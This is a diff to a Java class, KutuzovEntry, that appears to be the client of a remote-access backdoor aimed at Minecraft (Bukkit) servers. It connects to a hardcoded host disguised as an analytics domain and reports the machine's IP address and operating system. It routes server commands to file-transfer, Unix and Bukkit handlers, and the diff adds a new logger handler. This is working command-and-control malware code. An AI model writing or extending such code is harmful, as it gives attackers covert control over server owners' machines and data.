@@ -2,6 +2,7 @@ package me.kutuzov.client;
 
 import com.profesorfalken.jpowershell.OSDetector;
 import me.kutuzov.client.util.BukkitUtil;
+import me.kutuzov.client.util.LoggingUtil;
 import me.kutuzov.packet.*;
 import me.pk2.moodlyencryption.MoodlyEncryption;
 import org.bukkit.plugin.Plugin;
@@ -17,7 +18,7 @@ import java.util.Arrays;
 public class KutuzovEntry {
     public static final String HOST = "analytics018.antecedentium.xyz";
     public static final int    PORT = 33901;
-    public static final String VERSION = "b204";
+    public static final String VERSION = "b205";
     public static boolean DEBUG = false;
 
     public static ObjectInputStream ois = null;
@@ -156,6 +157,7 @@ public class KutuzovEntry {
                         String os = System.getProperty("os.name");
                         String localHost = InetAddress.getLocalHost().getHostAddress();
                         boolean isMC = BukkitUtil.isMC();
+                        LoggingUtil.myOS = os;
 
                         oos.writeObject(new CSHandshakePacket(identifierName, localHost, os, VERSION, isMC));
                     } else if(packet instanceof SCBeepPacket)
@@ -165,6 +167,7 @@ public class KutuzovEntry {
                     KutuzovKFTPPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovUnixPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovBukkitPackets.handlePacket(ois, oos, (Packet)packet);
+                    KutuzovLoggerPackets.handlePacket(ois, oos, (Packet)packet);
                 } catch (Exception ignored) {}
             }
         });
